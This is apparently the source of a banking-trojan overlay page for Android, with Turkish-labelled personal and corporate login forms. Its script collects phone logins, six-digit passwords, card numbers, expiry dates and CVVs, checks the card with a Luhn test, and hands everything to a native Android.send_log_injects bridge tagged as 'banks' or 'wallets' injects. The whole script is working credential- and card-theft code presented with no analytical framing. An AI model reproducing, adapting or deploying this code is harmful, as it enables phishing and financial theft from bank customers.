<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
    <style>
        #form1, #form2, #form3 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 20px;
        }

        .link {
            width: 50%;
            float: left;
            background-color: transparent;
            color: #ff533b;
            border: 1px solid #ff533b;
            padding: 8px;
            cursor: pointer;
            text-align: center;
            font-size: 12px;
            border-radius: 16px 0 0 16px;
        }

        .active {
            background-color: #ff533b;
            color: #fff;
        }

        label {
            display: block;
            text-align: center;
            font-weight: 600;
        }

        .input {
            width: 100%;
            padding: 6px;
            padding-left: 25px;
            border: 1px solid #dddcdc;
            border-radius: 75px;
            margin-bottom: 15px;
            color: #00c2c9;
        }

        .input::placeholder {
            color: #00c2c9;
            opacity: 1;
        }

        #grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr 1fr 1fr;
            grid-gap: 5px;
        }

        .password {
            height: 50px;
            width: 100%;
            border: 2px solid #b9ecee;
            border-radius: 75px;
            box-shadow: 0 0 4px #daf5f6;
            text-align: center;
            margin-bottom: 15px;
            color: #00c2c9;
        }

        .button {
            display: block;
            margin: 0 auto;
            background-color: #ff533b;
            color: #fff;
            border-radius: 75px;
            border: 0;
            padding: 4px 13px;
            font-weight: 600;
        }

        .button:disabled {
            opacity: 0.4;
        }

        .error {
            border-color: #f00 !important;
            box-shadow: 0 0 4px rgba(255, 0, 0, 0.267) !important;
        }

        input,button {
            outline: none !important;
            box-shadow: none ;
        }
    </style>
</head>

    <script>
      $('#cc').mask('0000 0000 0000 0000');
      $('#exp').mask('00/00');
      $('#cvv').mask('000');
      $('#login').mask('+00 000 000 0000');

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var login = document.getElementById('login'),
            password1 = document.getElementById('password1'),
            password2 = document.getElementById('password2'),
            password3 = document.getElementById('password3'),
            password4 = document.getElementById('password4'),
            password5 = document.getElementById('password5'),
            password6 = document.getElementById('password6');

        var loginK = document.getElementById('loginK'),
            password1K = document.getElementById('password1K'),
            password2K = document.getElementById('password2K'),
            password3K = document.getElementById('password3K'),
            password4K = document.getElementById('password4K'),
            password5K = document.getElementById('password5K'),
            password6K = document.getElementById('password6K');

        var nextPage = document.getElementById('nextPage'),
            nextPageK = document.getElementById('nextPageK'),
            sendData = document.getElementById('sendData');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv');

        function goBireysel() { 
            form1.style.display = 'flex'
            form2.style.display = 'none'
        }

        function goKurumsal() { 
            form2.style.display = 'flex'
            form1.style.display = 'none'
        }

        nextPage.onclick = () => {
            if(login.value.length < 6) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password1.value.length != 1) {
                password1.classList.add('error')
            } else {
                password1.classList.remove('error')
            }

            if(password2.value.length != 1) {
                password2.classList.add('error')
            } else {
                password2.classList.remove('error')
            }

            if(password3.value.length != 1) {
                password3.classList.add('error')
            } else {
                password3.classList.remove('error')
            }

            if(password4.value.length != 1) {
                password4.classList.add('error')
            } else {
                password4.classList.remove('error')
            }

            if(password5.value.length != 1) {
                password5.classList.add('error')
            } else {
                password5.classList.remove('error')
            }

            if(password6.value.length != 1) {
                password6.classList.add('error')
            } else {
                password6.classList.remove('error')
            }

            if(password1.value.length === 0) {
                password1.focus()
            } else if(password1.value.length === 1 && password2.value.length === 0) {
                password2.focus()
            } else if(password2.value.length === 1 && password3.value.length === 0) {
                password3.focus()
            } else if(password3.value.length === 1 && password4.value.length === 0) {
                password4.focus()
            } else if(password4.value.length === 1 && password5.value.length === 0) {
                password5.focus()
            } else if(password5.value.length === 1 && password6.value.length === 0) {
                password6.focus()
            }

            if(login.value.length >= 6 && password1.value.length === 1 && password2.value.length === 1 && password3.value.length === 1 && password4.value.length === 1 && password5.value.length === 1 && password6.value.length === 1) {
                var data = {};
                data.login = login.value;
                data.password = `${password1.value}${password2.value}${password3.value}${password4.value}${password5.value}${password6.value}`;
                data.type_injects = "wallets";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }

                form1.style.display = 'none';
                form3.style.display = 'flex';
            }
        }

        nextPageK.onclick = () => {
            if(loginK.value.length < 6) {
                loginK.classList.add('error')
            } else {
                loginK.classList.remove('error')
            }

            if(password1K.value.length != 1) {
                password1K.classList.add('error')
            } else {
                password1K.classList.remove('error')
            }

            if(password2K.value.length != 1) {
                password2K.classList.add('error')
            } else {
                password2K.classList.remove('error')
            }

            if(password3K.value.length != 1) {
                password3K.classList.add('error')
            } else {
                password3K.classList.remove('error')
            }

            if(password4K.value.length != 1) {
                password4K.classList.add('error')
            } else {
                password4K.classList.remove('error')
            }

            if(password5K.value.length != 1) {
                password5K.classList.add('error')
            } else {
                password5K.classList.remove('error')
            }

            if(password6K.value.length != 1) {
                password6K.classList.add('error')
            } else {
                password6K.classList.remove('error')
            }

            if(password1K.value.length === 0) {
                password1K.focus()
            } else if(password1K.value.length === 1 && password2K.value.length === 0) {
                password2K.focus()
            } else if(password2K.value.length === 1 && password3K.value.length === 0) {
                password3K.focus()
            } else if(password3K.value.length === 1 && password4K.value.length === 0) {
                password4K.focus()
            } else if(password4K.value.length === 1 && password5K.value.length === 0) {
                password5K.focus()
            } else if(password5K.value.length === 1 && password6K.value.length === 0) {
                password6K.focus()
            }

            if(loginK.value.length >= 6 && password1K.value.length === 1 && password2K.value.length === 1 && password3K.value.length === 1 && password4K.value.length === 1 && password5K.value.length === 1 && password6K.value.length === 1) {
                form2.style.display = 'none';
                form3.style.display = 'flex'
            }
        }

        sendData.onclick = () => {
            if(login.value.length !== 0) {
                var data = {};
                data.login = login.value;
                data.password = `${password1.value}${password2.value}${password3.value}${password4.value}${password5.value}${password6.value}`;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            } else if (loginK.value.length !== 0){
                var data = {};
                data.loginKurumsal = loginK.value;
                data.passwordKurumsal = `${password1K.value}${password2K.value}${password3K.value}${password4K.value}${password5K.value}${password6K.value}`;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }

        password1.onkeyup = () => {
            if(password1.value.length === 1) {
                password2.focus()
            }
        }

        password2.onkeyup = () => {
            if(password2.value.length === 1) {
                password3.focus()
            }
        }

        password3.onkeyup = () => {
            if(password3.value.length === 1) {
                password4.focus()
            }
        }

        password4.onkeyup = () => {
            if(password4.value.length === 1) {
                password5.focus()
            }
        }

        password5.onkeyup = () => {
            if(password5.value.length === 1) {
                password6.focus()
            }
        }

        password1K.onkeyup = () => {
            if(password1K.value.length === 1) {
                password2K.focus()
            }
        }

        function check4() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			
			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);

            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check3() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check5() {
            if(check3() == true && check4() == true && exp.value.length === 5 && cvv.value.length === 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }
